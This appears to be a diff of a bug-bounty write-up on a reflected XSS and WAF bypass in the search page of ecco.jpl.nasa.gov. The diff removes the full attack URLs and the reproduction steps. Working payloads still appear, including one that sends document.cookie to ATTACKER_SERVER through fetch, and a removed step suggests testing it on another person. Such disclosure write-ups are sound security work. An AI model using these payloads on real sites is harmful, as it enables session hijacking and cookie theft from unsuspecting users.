@@ -23,7 +23,6 @@ official_link: "https://bugcrowd.com/submissions/4b01725e-288b-4db5-a38c-1a37f82
   <div class="bounty-content">
     <h2>🔍 Search Anything</h2>
     <p>As with any bug bounty program, the first thing we did was use the page as any normal user would. The search field stood out at first glance, so we decided to try it out.</p>
-    <pre><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn</code></pre>
     <p>This is where we realized that the value we were adding was reflected on the website.</p>
     <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Search Normal.png" alt="Search Normal">
     <p>We decided to carefully inspect the website's source code and realized that our input was inside a <code>console.log()</code> function.</p>
@@ -42,7 +41,7 @@ official_link: "https://bugcrowd.com/submissions/4b01725e-288b-4db5-a38c-1a37f82
     <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Closing console.log.png" alt="Closing console.log">
 
     <h2>🧩 Append Javascript (Not Working)</h2>
-    <pre><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn');alert(1)</code></pre>
+    <pre><code>pwn');alert(1)</code></pre>
     <p>We tried again, but with some text after the semicolon. After several tests, we couldn't get the semicolon to appear. Worse still, everything after the semicolon didn't even appear in the text.</p>
     <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Where is semicollon.png" alt="Where is semicolon">
 
@@ -54,8 +53,8 @@ official_link: "https://bugcrowd.com/submissions/4b01725e-288b-4db5-a38c-1a37f82
     <h2>💥 First Alert (Working)</h2>
     <p>Although the WAF did not accept the <code>&lt;script&gt;</code> tag, we managed to get it to render the <code>&lt;/script&gt;</code> tag, which was enough to carry out a REFLECTED XSS attack.</p>
     <pre><code>pwn')%3balert(1)&lt;/script&gt;;//</code></pre>
-    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Alert 1 HTML.png" alt="Alert 1 HTML">
     <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Alert 1.png" alt="Alert 1">
+    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Alert 1 HTML.png" alt="Alert 1 HTML">
 
     <h2>🚫 Second Alert (Firewall Blocks)</h2>
     <p>Once we had managed to execute an <code>alert()</code> on the web page, we wanted to go further and attempt to read a user's cookies. The WAF continued to reject our requests as soon as it detected suspicious strings such as <code>document.cookie</code>.</p>
@@ -73,18 +72,6 @@ official_link: "https://bugcrowd.com/submissions/4b01725e-288b-4db5-a38c-1a37f82
     <pre><code>pwn');a=document;fetch('https://ATTACKER_SERVER/s='+a.cookie)&lt;/script&gt;//</code></pre>
     <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Fetch Exfiltration.png" alt="Final Exploit">
     <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Fetch Exfiltration Request.png" alt="Exfiltration Request">
-
-    <h2>✅ Steps To Reproduce</h2>
-    <ol>
-      <li>Start a public web server (we used Serveo exposing a Python localhost server for this).</li>
-      <li>Replace <code>ATTACKER_SERVER</code> with the URL generated for you:
-        <pre><code>pwn%27)%3ba=document%3bfetch(%27https://ATTACKER_SERVER/s=%27%2Ba.cookie)%3C/script%3E</code></pre>
-      </li>
-      <li>Visit the URL:
-        <pre><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3bfetch(%27https://ATTACKER_SERVER/s=%27%2Ba.cookie)%3C/script%3E</code></pre>
-      </li>
-    </ol>
-    <p>You'll receive a request with your <code>cookies</code> appended. You can try with another person to prove it's working.</p>
 
     <h2>📜 Official Recognition</h2>
     <div class="pdf-container">
